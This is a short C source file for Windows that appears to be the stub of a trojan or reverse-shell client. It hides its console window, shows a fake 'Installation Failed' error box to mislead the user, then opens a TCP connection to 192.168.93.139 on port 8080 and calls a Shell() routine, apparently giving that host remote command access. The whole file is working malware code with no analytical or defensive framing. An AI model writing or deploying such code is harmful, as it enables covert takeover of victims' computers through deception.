#include "stub.h"

SOCKET sock_fd;
struct sockaddr_in serv_addr;

WSADATA wsa;

void ConnectServer(){

	WSAStartup(MAKEWORD(2, 2), &wsa);

	if((sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET){
		WSACleanup();
		exit(-1);
	}

	memset(&serv_addr, 0, sizeof(serv_addr));

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(8080);
	serv_addr.sin_addr.s_addr = inet_addr("192.168.93.139");

	if(connect(sock_fd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR){
		exit(-1);
	}


	Shell();


}

int WINAPI WinMain(HMODULE hCurr, HMODULE hPrev, LPSTR CmdLine, int CmdShow){

	HWND stealth;

	AllocConsole();

	stealth = FindWindowA("ConsoleWindowClass", NULL);

	ShowWindow(stealth, SW_HIDE);

	MessageBoxA(NULL, "Installation Failed", NULL, MB_OK | MB_ICONERROR);

	ConnectServer();

	CloseSocket();

	return 0;

}
